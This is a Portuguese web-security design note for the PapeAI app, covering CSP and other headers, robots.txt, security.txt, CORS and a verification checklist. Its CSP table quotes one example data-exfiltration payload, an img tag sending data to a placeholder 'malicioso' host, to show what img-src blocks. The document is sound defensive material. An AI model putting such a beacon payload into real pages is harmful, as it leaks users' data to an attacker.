# Segurança web — cabeçalhos, CSP, robots.txt e security.txt

## Duas origens, duas políticas (ADR-0004)
| Origem | Conteúdo | Indexável? | Política |
|---|---|---|---|
| `https://<dominio>` (ex.: `papeai.com.br`) | Site institucional: apresentação, FAQ, privacidade, termos, página de exclusão de conta | **Sim** | CSP própria; pode ter mais liberdade (sem cofre) |
| `https://app.<dominio>` | O aplicativo (cofre, sessão, conversas) | **Nunca** | CSP máxima, zero terceiros |

Por que separar: armazenamento do navegador (IndexedDB, localStorage) é **por origem**. Qualquer coisa que rode no site institucional não enxerga o cofre do app. Antes do domínio próprio, usamos dois subdomínios gratuitos do provedor de hospedagem.

## Cabeçalhos do app (arquivo `app/public/_headers` — Cloudflare)
```text
/*
  Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self' https://api.anthropic.com https://<PROJETO>.supabase.co wss://<PROJETO>.supabase.co; media-src 'self' blob:; worker-src 'self' blob:; manifest-src 'self'; frame-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'; object-src 'none'; upgrade-insecure-requests
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  Referrer-Policy: no-referrer
  Permissions-Policy: microphone=(self), camera=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=()
  Cross-Origin-Opener-Policy: same-origin
  Cross-Origin-Resource-Policy: same-origin
  X-Robots-Tag: noindex, nofollow, noarchive
/index.html
  Cache-Control: no-cache
/sw.js
  Cache-Control: no-cache
/assets/*
  Cache-Control: public, max-age=31536000, immutable
```
> Sintaxe exata do `_headers` e se usamos Pages ou Workers com assets estáticos: confirmar na F01.

### A CSP explicada linha a linha
| Diretiva | Valor | Por quê |
|---|---|---|
| `default-src` | `'none'` | Começa tudo bloqueado |
| `script-src` | `'self'` | Só scripts do próprio app. **Sem** `unsafe-inline`, **sem** `unsafe-eval`, **sem** CDNs |
| `style-src` | `'self'` | CSS compilado (Tailwind). Estilos aplicados via JS pelo React usam CSSOM e não exigem `unsafe-inline` |
| `img-src` | `'self' data: blob:` | Bloqueia imagens externas — impede exfiltração via `<img src="https://malicioso/?dados=...">` |
| `connect-src` | app + Anthropic + Supabase | **A cerca da chave**: o navegador recusa enviar dados para qualquer outro lugar |
| `media-src` | `'self' blob:` | Áudio gerado/gravado localmente |
| `worker-src` | `'self' blob:` | Service worker e workers de áudio/modelos |
| `frame-ancestors` | `'none'` | Ninguém coloca o app num iframe (anti-clickjacking) |
| `base-uri` / `form-action` / `object-src` | restritos | Fecha truques clássicos de injeção |

### Ajustes previstos (cada um exige registro na ADR correspondente)
| Fase | Ajuste | Motivo |
|---|---|---|
| F07 | `script-src 'self' 'wasm-unsafe-eval'` | Executar modelos de voz em WebAssembly no aparelho |
| F07 | `connect-src` + domínio do provedor de voz BYOK escolhido | Voz em nuvem opcional |
| F07 | `Cross-Origin-Embedder-Policy: require-corp` (avaliar) | Habilita `SharedArrayBuffer` (WASM multithread, mais rápido) |
| F01 (meta) | `require-trusted-types-for 'script'` | Bloqueia injeção de HTML por strings; validar compatibilidade das bibliotecas antes de ativar |

### Regras de código que sustentam a CSP
- Proibido `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function`, `document.write` (regras de lint).
- Texto vindo da IA: renderizado como texto ou com Markdown **restrito** (negrito, itálico, listas, código), **sem HTML bruto**, **sem imagens**; links exibidos como texto (não clicáveis) ou com confirmação explícita.
- Fontes **self-hosted** (`app/public/fonts`) — nada de Google Fonts por link.
- Nenhum script de terceiros: sem analytics, sem widgets, sem chat de suporte embutido.

## Cabeçalhos do site institucional
Mesma base, com ajustes: `X-Robots-Tag` **removido** (o site é indexável), `connect-src 'self'` (o site não chama APIs), `img-src 'self' data:`. Sem cofre, sem sessão.

## robots.txt
> ⚠️ **robots.txt não é segurança.** É um arquivo **público** que *pede* a robôs bem-comportados para não indexar certas páginas. Qualquer pessoa pode lê-lo. Por isso: (1) nunca listar caminhos "secretos" nele; (2) a proteção real das áreas internas é login + RLS.

**App (`app/public/robots.txt`)** — nada é indexado:
```text
User-agent: *
Disallow: /
```
+ cabeçalho `X-Robots-Tag: noindex, nofollow, noarchive` + `<meta name="robots" content="noindex, nofollow">` no `index.html` (cinto e suspensório: o `noindex` vale mesmo se alguém linkar o app).

**Site institucional (`site/public/robots.txt`)**:
```text
User-agent: *
Allow: /
Sitemap: https://<dominio>/sitemap.xml
```
Opcional (Q-19): bloquear robôs de treinamento de IA no site, adicionando blocos `User-agent: <robô>` + `Disallow: /`.

## security.txt (`/.well-known/security.txt` nas duas origens)
```text
Contact: https://github.com/<usuario>/PapeAI/security/advisories/new
Expires: <data ISO, no máximo 1 ano à frente>
Preferred-Languages: pt, en
Policy: https://github.com/<usuario>/PapeAI/blob/main/SECURITY.md
Canonical: https://app.<dominio>/.well-known/security.txt
```
Contato pelo recurso de **relato privado de vulnerabilidades** do GitHub (sem expor e-mail pessoal).

## Service worker (PWA)
- Escopo restrito ao app; atualização com aviso "nova versão disponível".
- Cacheia **só arquivos estáticos**. Nunca cacheia respostas autenticadas do Supabase nem chamadas à IA.

## CORS das Edge Functions
- `Access-Control-Allow-Origin` só para as origens do app (dev e prod). Nunca `*` em função que usa JWT.

## Como verificar (em todo portão que mexe em hospedagem)
- [ ] Scanner público de cabeçalhos (ex.: Mozilla HTTP Observatory, securityheaders.com) com nota máxima ou justificativa.
- [ ] Avaliador de CSP (ex.: CSP Evaluator) sem alertas altos.
- [ ] Teste E2E `e2e.csp-blocks` passando.
- [ ] `curl -I` mostrando os cabeçalhos em produção (saída colada no relatório do portão).
- [ ] `robots.txt` e `X-Robots-Tag` corretos nas duas origens.
